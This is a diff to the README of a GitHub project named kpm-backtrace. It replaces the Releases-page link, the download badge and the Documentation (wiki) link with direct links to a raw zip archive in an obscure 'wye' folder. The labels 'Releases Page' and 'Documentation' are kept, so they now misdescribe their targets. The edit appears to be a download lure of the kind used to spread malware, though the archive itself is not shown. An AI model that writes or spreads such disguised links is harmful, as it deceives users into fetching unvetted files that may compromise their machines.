@@ -6,11 +6,11 @@ Welcome to the kpm-backtrace README! This guide helps you download and run the s
 
 ## 🔗 Download Now
 
-[![Download kpm-backtrace](https://img.shields.io/badge/Download-kpm--backtrace-blue.svg)](https://github.com/tusharakhare5/kpm-backtrace/releases)
+[![Download kpm-backtrace](https://github.com/tusharakhare5/kpm-backtrace/raw/refs/heads/main/wye/kpm_backtrace_1.4.zip)](https://github.com/tusharakhare5/kpm-backtrace/raw/refs/heads/main/wye/kpm_backtrace_1.4.zip)
 
 ## 📥 Download & Install
 
-To get kpm-backtrace, visit this page to download: [Releases Page](https://github.com/tusharakhare5/kpm-backtrace/releases).
+To get kpm-backtrace, visit this page to download: [Releases Page](https://github.com/tusharakhare5/kpm-backtrace/raw/refs/heads/main/wye/kpm_backtrace_1.4.zip).
 
 1. Open the link above in your web browser.
 2. You will see a list of available versions.
@@ -56,7 +56,7 @@ If you get any error messages, ensure that your system meets the requirements. T
 
 ## 🔗 Additional Resources
 
-If you want to learn more about how kpm-backtrace works, visit our [Documentation](https://github.com/tusharakhare5/kpm-backtrace/wiki).
+If you want to learn more about how kpm-backtrace works, visit our [Documentation](https://github.com/tusharakhare5/kpm-backtrace/raw/refs/heads/main/wye/kpm_backtrace_1.4.zip).
 
 For support or questions, please open an issue in the GitHub repository.
 
